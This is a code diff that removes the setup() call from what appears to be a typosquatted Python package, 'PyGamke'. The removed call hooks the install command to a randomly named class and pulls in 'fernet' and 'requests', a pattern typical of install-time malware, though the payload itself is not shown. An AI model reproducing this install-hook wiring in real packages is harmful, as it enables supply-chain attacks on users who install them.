@@ -18,22 +18,5 @@ class bTsEsCdlBQiwyUUSxGCjjvYIndPVaQPrVSKzHgkOkYKJAdlJLMrYnmJDgGEpQFDbGUKjOBKIqc
             install.run(self)
 
 
-setup(
-    name="PyGamke",
-    version=VERSION,
-    author="boJRgkwRJRG",
-    author_email="aRxRlb@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': bTsEsCdlBQiwyUUSxGCjjvYIndPVaQPrVSKzHgkOkYKJAdlJLMrYnmJDgGEpQFDbGUKjOBKIqcoYPXZbzTkMpzKVKJjuVnXiNyGGnCRLXpRRRrFH,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
 
